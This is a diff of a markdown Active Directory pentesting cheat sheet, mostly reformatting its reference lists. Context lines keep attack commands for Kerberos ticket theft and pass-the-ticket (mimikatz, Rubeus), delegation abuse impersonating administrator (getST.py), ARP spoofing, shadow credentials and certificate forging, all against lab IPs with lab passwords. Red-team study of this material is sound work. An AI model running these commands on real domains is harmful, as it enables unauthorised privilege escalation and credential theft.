@@ -200,10 +200,10 @@ This attack will require you to arp spoof and wait for AS-REQ and perform kerber
 ritm -i eth0 -t 192.168.86.184 -g 192.168.86.1 -d 192.168.86.182 -u /tmp/users.lst
 ```
 
-**References**
-* https://www.semperis.com/blog/new-attack-paths-as-requested-sts/
-* https://github.com/Tw1sm/RITM
-* https://twitter.com/_nwodtuhs/status/1575082377189429250?s=20&t=iS5ugj6lp5GyL6QF4jWn0Q
+>[!References]
+>- https://www.semperis.com/blog/new-attack-paths-as-requested-sts/
+>- https://github.com/Tw1sm/RITM
+>- https://twitter.com/_nwodtuhs/status/1575082377189429250?s=20&t=iS5ugj6lp5GyL6QF4jWn0Q
 
 ### Unconstrained / Constrained Object
 ```powershell
@@ -276,9 +276,14 @@ mimikatz# sekurlsa::tickets /export
 Rubeus.exe ptt /ticket:ticket.kirbi
 ```
 
+>[!References]
+>- https://www.thehacker.recipes/a-d/movement/kerberos/delegations/unconstrained
+>- https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
+
 ## Constrained Delegation
 ### s4u delegation
 This attack is possible if `msds-AllowedToDelegateTo` is set.
+
 * with rc4 hash in hand
 ```powershell
 # Request TGT + TGS
@@ -287,6 +292,7 @@ Rubeus.exe s4u /user:attacker /rc4:<rc4 hash> /impersonateuser:administrator /ms
 # impacket
 getST.py -spn cifs/TargetComputer.range.net 'range.net/FakeComputer$:newpassword123' -impersonate administrator -dc-ip 192.168.86.182
 ```
+
 * with owned user session (not knowing his rc4)
 ```powershell
 # Request for ticket
@@ -296,12 +302,13 @@ Rubeus.exe tgtdeleg /nowrap
 Rubeus.exe s4u /user:attacker /ticket:<base64-blob> /impersonateuser:administrator /msdsspn:time/dc01 /altservice:cifs,http,host /domain:contoso.local /dc:dc01.contoso.local /ptt
 ```
 
-## Resource-Based Constrained Delegation
+## Resource-Based Constrained Delegation (RBCD)
 This attack is possible if owned user/computer object has _GenericWrite_ or write privilege to user/computer object attributes. Since we have write privilege, we can write to _msds-allowedtoactonbehalfofotheridentity_ property. There are few requirements needed in order to perform this attack.
-| Name                                              | Value       |
-| ------------------------------------------------- | ----------- |
-| Domain object with SPN set (computer/service acc) | mycomputer$ |
-| Principal's plain-text or hashes (rc4/aes-256)    | Range2022!  | 
+
+| Name                                              | Value         |
+| ------------------------------------------------- | ------------- |
+| Domain object with SPN set (computer/service acc) | `mycomputer$` |
+| Principal's plain-text or hashes (rc4/aes-256)    | `Range2022!`  |
 1. Import ADModule
 2. Set _msds-allowedtoactonbehalfofotheridentity_ to owned computer/user objects.
 ```powershell
@@ -327,9 +334,11 @@ Rubeus.exe s4u /user:mycomputer$ /rc4:<rc4/ntlm hash> /impersonateuser:administr
 getST.py range.net/mssqlsvc:'Range2022!' -dc-ip 192.168.86.182 -spn cifs/dc01.range.net -impersonate Administrator
 ```
 
-#### References
-1. [Harmj0y's gist on abusing RBCD with PowerShell/PowerView/PowerMad](https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff)
-2. [ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
+>[!References]
+>- [Harmj0y's gist on abusing RBCD with PowerShell/PowerView/PowerMad](https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff)
+>- [ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
+
+
 
 # ACLs/ACEs Abuse
 ### Force Change User Password
@@ -411,11 +420,11 @@ py pywhisker.py -d "range.net" -u "rangeadm" -p "Password123" -t "lowpriv" --act
 
 Once you have obtained the certificate, it can further use the [Pass-The-Certificate](#pass-the-certificate) attack to authenticate. 
 
-**References**
-* https://pentestlab.blog/2022/02/07/shadow-credentials/
-* https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials
-* https://github.com/ShutdownRepo/pywhisker
-* https://github.com/eladshamir/Whisker
+> [!References]
+>- https://pentestlab.blog/2022/02/07/shadow-credentials/
+>- https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials
+>- https://github.com/ShutdownRepo/pywhisker
+>- https://github.com/eladshamir/Whisker
 
 # Weak GPO Permission
 ### Enumerate weak GPO Permission
@@ -876,10 +885,10 @@ python pyForgeCert.py -i cert.pfx -o admin.pfx -pfx -p admin
 3. Use Pass-The-Certificate and win!
 ```
 
-**References**
-* https://pentestlab.blog/2021/11/15/golden-certificate/
-* https://github.com/Ridter/pyForgeCert
-* https://github.com/ly4k/Certipy
+>[!References]
+>- https://pentestlab.blog/2021/11/15/golden-certificate/
+>- https://github.com/Ridter/pyForgeCert
+>- https://github.com/ly4k/Certipy
 
 ### Sapphire Ticket
 As mentioned in [hacker.recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire)
@@ -1116,10 +1125,10 @@ getST.py range.net/lowpc2\$:Password123 -spn http/ws01.range.net -impersonate Ad
 wmiexec.py range.net/Administrator@ws01.range.net -no-pass -k
 ```
 
-### References
-* https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/
-- https://twitter.com/an0n_r0/status/1571598587439775745?s=20&t=q3-YgJ7LcZATARKd0JnlKQ
-- https://www.trustedsec.com/blog/practical-attacks-against-ntlmv1/?utm_content=221361665&utm_medium=social&utm_source=twitter&hss_channel=tw-403811306
+>[!References]
+>- https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/
+>- https://twitter.com/an0n_r0/status/1571598587439775745?s=20&t=q3-YgJ7LcZATARKd0JnlKQ
+>- https://www.trustedsec.com/blog/practical-attacks-against-ntlmv1/?utm_content=221361665&utm_medium=social&utm_source=twitter&hss_channel=tw-403811306
 
 # PrintNightmare
 Abusing printer spooler service (CVE-2021-34527) to load malicious DLL and execute as SYSTEM. Available POCs can be found here
@@ -1447,11 +1456,10 @@ addcomputer.py range.net/Administrator:'Password123' -computer-name 'WIN-EAZXIGM
 ```
 
 For the details explanation of the vulnerability (CVE-2022-26923), you may read the full article [here](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
-
-### ADCS References
-* https://luemmelsec.github.io/Skidaddle-Skideldi-I-just-pwnd-your-PKI/
-* https://www.thehacker.recipes/ad/movement/ad-cs/
-* https://mayfly277.github.io/posts/GOADv2-pwning-part6/
+>[!ADCS References]
+>- https://luemmelsec.github.io/Skidaddle-Skideldi-I-just-pwnd-your-PKI/
+>- https://www.thehacker.recipes/ad/movement/ad-cs/
+>- https://mayfly277.github.io/posts/GOADv2-pwning-part6/
 
 # References
 * https://www.harmj0y.net/
